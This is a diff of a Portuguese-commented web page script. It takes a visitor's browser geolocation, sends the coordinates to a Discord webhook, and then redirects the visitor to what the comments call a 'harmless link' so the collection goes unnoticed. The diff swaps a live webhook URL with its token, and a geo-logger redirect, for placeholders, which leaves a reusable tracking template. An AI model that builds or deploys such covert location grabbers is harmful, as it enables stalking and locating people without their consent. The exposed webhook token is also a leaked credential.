@@ -56,7 +56,7 @@
         const loadingMessage = document.getElementById('loadingMessage');
 
         // URL do webhook do Discord (substitua pelo seu webhook)
-        const discordWebhookURL = 'https://discord.com/api/webhooks/1249056666033455225/T1iGo5pt8RrQoLeQ_nK2FEXU8zL6ehwxsqMbX02oVGsUoM6c880KQ4D2ZKEfZVflElke';
+        const discordWebhookURL = 'SUA_URL_DO_WEBHOOK_AQUI';
 
         // Função para enviar a localização para o Discord
         const sendLocationToDiscord = async (latitude, longitude) => {
@@ -86,19 +86,19 @@
                         const { latitude, longitude } = position.coords;
                         sendLocationToDiscord(latitude, longitude); // Envia para o Discord
                         // Redireciona para um link inofensivo após coletar a localização
-                        window.location.href = 'https://2no.co/24qGe7.html'; // Substitua pelo link desejado
+                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                     },
                     (error) => {
                         console.error('Erro ao obter localização:', error.message);
                         // Redireciona mesmo se a localização falhar
-                        window.location.href = 'https://2no.co/24qGe7.html'; // Substitua pelo link desejado
+                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                     },
                     { timeout: 10000 } // Timeout de 10 segundos
                 );
             } else {
                 console.error('Geolocalização não é suportada pelo navegador.');
                 // Redireciona se a geolocalização não for suportada
-                window.location.href = 'https://2no.co/24qGe7.html'; // Substitua pelo link desejado
+                window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
             }
         };
 
